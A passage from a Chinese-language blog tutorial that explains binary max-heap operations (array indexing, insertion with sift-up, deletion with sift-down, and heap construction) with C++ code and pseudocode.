style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span></span></span></span></p>
</blockquote>
<p>数组索引从1开始：</p>
<blockquote>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mo>=</mo><mn>2</mn><mi>i</mi></mrow><annotation encoding="application/x-tex">l=2i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">i</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mo>=</mo><mn>2</mn><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">r=2i+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mo>=</mo><mo stretchy="false">⌊</mo><mfrac><mi>l</mi><mn>2</mn></mfrac><mo stretchy="false">⌋</mo><mo>=</mo><mo stretchy="false">⌊</mo><mfrac><mi>r</mi><mn>2</mn></mfrac><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">i=\lfloor \frac{l}{2} \rfloor=\lfloor \frac{r}{2} \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span></span></span></span></p>
</blockquote>
<p>两者均采用了<code>向下取整floor</code>是防止数组下标越界同时还能保证不同左右孩子的父节点索引相同；数组索引从1开始是为了简化运算，除此之外没有差别，本文是采用第一种方式。<br />
<img src="/uploads/images/data_structure/heap_cpp/02.png" alt="" /></p>
<p>本文仅仅演示最大堆的基本操作，最小堆也是类似的。<br />
首先定义堆的ADT</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Heap</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp;)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> T&amp; <span class="hljs-title">top</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Heap</span>()&#123;&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<p>从<code>Heap</code>派生出最大堆<code>maxHeap</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">maxHeap</span>:</span> <span class="hljs-keyword">public</span> Heap&lt;T&gt;&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">maxHeap</span>(<span class="hljs-keyword">int</span> init_capacity=<span class="hljs-number">20</span>);<br>    ~<span class="hljs-built_in">maxHeap</span>();<br>    <span class="hljs-comment">// 插入元素</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp; data)</span></span>;<br>    <span class="hljs-comment">// 删除堆顶元素</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> m_heapSize;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">capacity</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> m_capacity;&#125;<br>    <span class="hljs-comment">// 获取堆顶元素</span><br>    <span class="hljs-function">T&amp; <span class="hljs-title">top</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(m_heapSize&gt;=<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> m_heap[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;heap is empty&quot;</span>;<br>    &#125;;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> m_heapSize==<span class="hljs-number">0</span>;&#125;<br><span class="hljs-keyword">protected</span>:<br>    <span class="hljs-comment">// 改变数组大小</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">changeHeapCapacity</span><span class="hljs-params">(<span class="hljs-keyword">int</span> oldLength,<span class="hljs-keyword">int</span> newLength)</span></span>&#123;<br>        T *temp=<span class="hljs-keyword">new</span> T[newLength];<br>        m_capacity=newLength;<br>        std::<span class="hljs-built_in">copy</span>(m_heap,m_heap+m_heapSize,temp);<br>        <span class="hljs-keyword">delete</span>[] m_heap;<br>        m_heap=temp;<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    T *m_heap;<br>    <span class="hljs-keyword">int</span> m_capacity;<br>    <span class="hljs-keyword">int</span> m_heapSize;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<h5 id="二叉堆的插入"><a class="markdownIt-Anchor" href="#二叉堆的插入"></a> 二叉堆的插入</h5>
<p>最大堆的插入必须要确保每个节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>≥</mo></mrow><annotation encoding="application/x-tex">\ge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">≥</span></span></span></span>其子节点。<br />
向最大堆插入一个节点步骤如下：</p>
<ul>
<li>在最大堆的底部最左边添加一个新节点作为子节点，也就是在数组内有效元素的下一个位置插入；</li>
<li>若子节点&gt;父节点，则交换它们的值，继续向上调整；否则调整结束。</li>
</ul>
<p>二叉堆插入时间复杂度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>H</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(Height)=O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>向上调整就像冒泡排序一样，从叶子到根不断将新节点移动到某个位置直到该新节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>≤</mo></mrow><annotation encoding="application/x-tex">\le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">≤</span></span></span></span>其父节点。<br />
以下图为例，假设数组大小为12，在数组尾部插入70后是不满足二叉堆性质的，因此需要调整。调整方法很简单，依次将70“上浮”到某个合适的位置，也就是通过比较该节点与父节点的值来进行的。<br />
<img src="/uploads/images/data_structure/heap_cpp/03.png" alt="" /><br />
由于70&gt;45，<code>节点70</code>在数组中的索引为8，可以计算出<code>父节点45</code>索引为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">⌊</mo><mfrac><mrow><mn>8</mn><mo>−</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo stretchy="false">⌋</mo><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">\lfloor \frac{8-1}{2} \rfloor=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>，于是交换他们的值，此时<code>节点70</code>所在数组的索引为3；<br />
<img src="/uploads/images/data_structure/heap_cpp/04.png" alt="" /></p>
<p>接着继续判断<code>节点70</code>和<code>父节点60</code>大小，70&gt;60，继续交换<code>节点70</code>与<code>父节点60</code>的值；此时70&lt;80，调整结束。</p>
<p><img src="/uploads/images/data_structure/heap_cpp/05.png" alt="" /></p>
<p>如果在空堆中插入节点直接插入即可，注意此处并没有直接交换父节点和子节点，而是将父节点不断的向下移动，最后在合适位置插入新节点。</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> maxHeap&lt;T&gt;::<span class="hljs-built_in">push</span>(<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    <span class="hljs-comment">// 数组扩容</span><br>    <span class="hljs-keyword">if</span>(m_heapSize&gt;=m_capacity)&#123;<br>        <span class="hljs-built_in">changeHeapCapacity</span>(m_capacity,<span class="hljs-number">2</span>*m_capacity);<br>    &#125;<br>    <span class="hljs-comment">// 子节点索引</span><br>    <span class="hljs-keyword">int</span> index=m_heapSize;<br>    <span class="hljs-comment">// 父节点索引，向下取整</span><br>    <span class="hljs-keyword">int</span> parent_index=((index<span class="hljs-number">-1</span>)/<span class="hljs-number">2</span>);<br>    <br>    <span class="hljs-comment">// 向上调整</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">if</span>(index==<span class="hljs-number">0</span>)<span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">// 若子节点大于父节点，继续向上调整</span><br>        <span class="hljs-keyword">if</span>(data &gt; m_heap[parent_index])<br>            m_heap[index]=m_heap[parent_index];<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">break</span>;<br>        index=parent_index;<br>        parent_index=((index<span class="hljs-number">-1</span>)/<span class="hljs-number">2</span>);<br>    &#125;<br>    m_heap[index]=data;<br>    m_heapSize++;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h5 id="二叉堆的删除"><a class="markdownIt-Anchor" href="#二叉堆的删除"></a> 二叉堆的删除</h5>
<p>一般二叉堆的删除指的是删除堆顶元素，其步骤如下：</p>
<ul>
<li>删除堆顶元素并将二叉堆最底层的最后一个节点(数组最后一个元素)替换到堆顶位置(数组第一个元素)；</li>
<li>先比较父节点的左右孩子的大小，<code>较大的子节点</code>再与<code>父节点</code>进行比较，若父节点&lt;其子节点，继续向下调整；否则调整结束。</li>
</ul>
<p>二叉堆删除时间复杂度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>H</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(Height)=O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。</p>
<p><img src="/uploads/images/data_structure/heap_cpp/06.png" alt="" /><br />
删除根节点80，将节点45替换到根节点，此时不满足二叉堆性质，故继续向下调整。此时有效数组大小为<code>heapSize-1</code>。<br />
<img src="/uploads/images/data_structure/heap_cpp/07.png" alt="" /></p>
<ul>
<li>父节点45的左右孩子节点70&gt;50且45&lt;70，故交换值后继续向下调整；</li>
<li>父节点45的左右孩子节点60&gt;40且45&lt;60，故交换值后继续向下调整；</li>
<li>父节点45只有左孩子且45&gt;10，故调整结束。</li>
</ul>
<p><img src="/uploads/images/data_structure/heap_cpp/08.png" alt="" /></p>
<p>类似插入操作此处也并没有直接交换父节点和子节点值，而是将子节点不断的向上移动，最后在合适位置插入旧值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> maxHeap&lt;T&gt;::<span class="hljs-built_in">pop</span>()&#123;<br>    <span class="hljs-keyword">if</span>(m_heapSize&lt;=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> child_index=<span class="hljs-number">2</span>*index+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> lastChild=m_heap[--m_heapSize];<br><br>    <span class="hljs-comment">// 向下调整</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-keyword">if</span>(child_index &gt;= m_heapSize)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">// 当父节点只有一个左孩子时，child_index+1 &lt; m_heapSize不成立</span><br>        <span class="hljs-keyword">if</span>(child_index+<span class="hljs-number">1</span> &lt; m_heapSize &amp;&amp; m_heap[child_index]&lt;m_heap[child_index+<span class="hljs-number">1</span>])&#123;<br>            child_index++;<br>        &#125;<br>        <span class="hljs-comment">// 若父节点&lt;子节点，继续向下调整</span><br>        <span class="hljs-keyword">if</span>(lastChild &lt; m_heap[child_index])<br>            m_heap[index]=m_heap[child_index];<br>        <span class="hljs-keyword">else</span> <br>            <span class="hljs-keyword">break</span>;<br>        index=child_index;<br>        child_index=<span class="hljs-number">2</span>*index+<span class="hljs-number">1</span>;<br>    &#125;<br>    m_heap[index]=lastChild;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h5 id="构建二叉堆"><a class="markdownIt-Anchor" href="#构建二叉堆"></a> 构建二叉堆</h5>
<p>构建二叉堆是在一个循环内不断地插入元素，实际上这是Williams法，其复杂度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> array[]=&#123;<span class="hljs-number">90</span> , <span class="hljs-number">40</span> ,<span class="hljs-number">30</span> ,<span class="hljs-number">60</span> ,<span class="hljs-number">70</span> ,<span class="hljs-number">200</span> ,<span class="hljs-number">20</span> ,<span class="hljs-number">10</span> ,<span class="hljs-number">50</span> ,<span class="hljs-number">80</span>&#125;;<br>maxHeap&lt;<span class="hljs-keyword">int</span>&gt;mhp;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;&amp;x:array) &#123;<br>    mhp.<span class="hljs-built_in">push</span>(x);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>但是，Williams的方法不够好。事实上，我们可以直接在原数组通过向下调整的方法来建堆，而且这种方法比上面的方法还要快。<br />
维基百科中有一段话</p>
<blockquote>
<p>More specifically if all the subtrees starting at some height <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span> have already been “heapified” (the bottommost level corresponding to <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">h=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>), the trees at height <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">h+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> can be heapified by sending their root down along the path of maximum valued children when building a max-heap, or minimum valued children when building a min-heap</p>
</blockquote>
<p>大概意思是说，如果一个二叉堆的底层子树也是二叉堆的话，那么可以逐层向上合并这些子二叉堆，也就是在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span>层存在多个子树已经堆化，那么在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">h+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>层可以很快的完成调整。</p>
<figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql"><span class="hljs-keyword">Build</span>-<span class="hljs-built_in">Max</span>-Heap (A):<br>    heap_length[A] ← <span class="hljs-built_in">length</span>[A]<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">index</span> i <span class="hljs-keyword">from</span> <span class="hljs-built_in">floor</span>((<span class="hljs-built_in">length</span>[A]<span class="hljs-number">-1</span><span class="hljs-number">-1</span>)/<span class="hljs-number">2</span>) downto <span class="hljs-number">0</span> <span class="hljs-keyword">do</span>:<br>        <span class="hljs-built_in">Max</span>-Heapify(A, i)<br></code></pre></div></td></tr></table></figure>
<p>比如下面这张图，数组表示为<code>[90 40 30 60 70 200]</code>，这不是一个二叉堆，现在需要将其调整为二叉堆。<br />
从<code>floor((length[A]-1-1)/2)</code>开始（最后一个子节点的父节点），依次递减直到<code>0</code>（根节点），虚线框表示已经完成堆化的子树。</p>
<p>其中<code>parent</code>代表要下浮的节点，从父节点开始将<code>parent</code>下浮到某个合适位置。最后结果就是真正的二叉堆<code>[200 70 90 60 40 30]</code>。</p>
<p><img src="/uploads/images/data_structure/heap_cpp/09.png" alt="" /></p>
<p>总之该方法一句话搞定：逐层向上（从右到左，从下到上）的向下调整。<br />
代码如下</p>
